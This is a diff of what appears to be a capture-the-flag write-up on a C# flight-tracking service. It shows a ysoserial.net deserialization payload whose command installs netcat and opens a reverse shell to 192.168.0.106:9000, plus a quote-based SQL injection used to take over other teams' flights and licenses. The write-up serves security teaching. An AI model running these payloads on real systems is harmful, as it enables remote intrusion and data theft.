@@ -10,11 +10,11 @@ FlightState model is C#-class and is sent serialized in binary format using ordi
 
 It is possible to generate malformed serialized data which forces server to execute any code.
 
-The easiest way to generate serialized binary data with reverse shell payload is to use lovely [ysoserial.net  tool](https://github.com/pwntester/ysoserial.net) (let's say thanks to Alvaro Muñoz [pwntester](https://github.com/pwntester) for it).
+The easiest way to generate serialized binary data with reverse shell payload is to use lovely [ysoserial.net  tool](https://github.com/pwntester/ysoserial.net). Let's say thanks to Alvaro Muñoz ([pwntester](https://github.com/pwntester)) for it.
 
-Suppose, we listen port 9000 on 192.168.0.106 (run `nc -lp 9000`).
+Suppose we listen port 9000 on 192.168.0.106 (run `nc -lp 9000`).
 
-Compile ysoserial.exe, generate malformed data  for Mono with payload `apt update && apt install -y netcat && nc -e /bin/sh 192.168.0.106 9000` to make reverse shell.
+Compile ysoserial.exe, generate malformed data for Mono with payload `apt update && apt install -y netcat && nc -e /bin/sh 192.168.0.106 9000` to make reverse shell.
 
     ./ysoserial.exe -g TypeConfuseDelegateMono -f BinaryForm
     atter -c "sh -c 'apt update && apt install -y netcat && nc -e /bin/sh 192.168.0.106 9000'" -o base64 --rawcmd
@@ -81,8 +81,8 @@ WHERE id = {flightState.FlightId};");
 ```
 
 
-
 Register and get auth token for your user. From response you can deserialize `flights_ids` of other users. Then send FlightState with your token and other team's `flight_id` to reassign `user_id`. Also we don't want to overwrite `license` so we should put `'` in Label and License (after it Label will have value ` ', license = '` and License will not change).
+
 
 ```
 var fs = new FlightState()
@@ -96,5 +96,6 @@ var fs = new FlightState()
 	Finished = false
 };
 ```
+
 
 So it will make this flight belongs to your user and its license will be available to you from `/Chronicle` page.
